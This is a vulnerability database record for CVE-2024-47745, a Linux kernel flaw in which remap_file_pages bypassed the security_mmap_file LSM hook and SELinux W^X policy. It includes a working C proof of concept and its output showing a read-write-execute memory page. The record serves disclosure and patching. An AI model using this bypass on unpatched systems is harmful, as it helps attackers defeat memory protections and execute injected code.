vulnerability_id: VCID-tpqy-gw4x-2qb2
aliases:
  - CVE-2024-47745
summary: "In the Linux kernel, the following vulnerability has been resolved:\n\nmm: call the\
  \ security_mmap_file() LSM hook in remap_file_pages()\n\nThe remap_file_pages syscall handler\
  \ calls do_mmap() directly, which\ndoesn't contain the LSM security check. And if the process\
  \ has called\npersonality(READ_IMPLIES_EXEC) before and remap_file_pages() is called for\n\
  RW pages, this will actually result in remapping the pages to RWX,\nbypassing a W^X policy\
  \ enforced by SELinux.\n\nSo we should check prot by security_mmap_file LSM hook in the\n\
  remap_file_pages syscall handler before do_mmap() is called. Otherwise, it\npotentially permits\
  \ an attacker to bypass a W^X policy enforced by\nSELinux.\n\nThe bypass is similar to CVE-2016-10044,\
  \ which bypass the same thing via\nAIO and can be found in [1].\n\nThe PoC:\n\n$ cat > test.c\n\
  \nint main(void) {\n\tsize_t pagesz = sysconf(_SC_PAGE_SIZE);\n\tint mfd = syscall(SYS_memfd_create,\
  \ \"test\", 0);\n\tconst char *buf = mmap(NULL, 4 * pagesz, PROT_READ | PROT_WRITE,\n\t\t\
  MAP_SHARED, mfd, 0);\n\tunsigned int old = syscall(SYS_personality, 0xffffffff);\n\tsyscall(SYS_personality,\
  \ READ_IMPLIES_EXEC | old);\n\tsyscall(SYS_remap_file_pages, buf, pagesz, 0, 2, 0);\n\tsyscall(SYS_personality,\
  \ old);\n\t// show the RWX page exists even if W^X policy is enforced\n\tint fd = open(\"\
  /proc/self/maps\", O_RDONLY);\n\tunsigned char buf2[1024];\n\twhile (1) {\n\t\tint ret = read(fd,\
  \ buf2, 1024);\n\t\tif (ret <= 0) break;\n\t\twrite(1, buf2, ret);\n\t}\n\tclose(fd);\n}\n\
  \n$ gcc test.c -o test\n$ ./test | grep rwx\n7f1836c34000-7f1836c35000 rwxs 00002000 00:01\
  \ 2050 /memfd:test (deleted)\n\n[PM: subject line tweaks]"
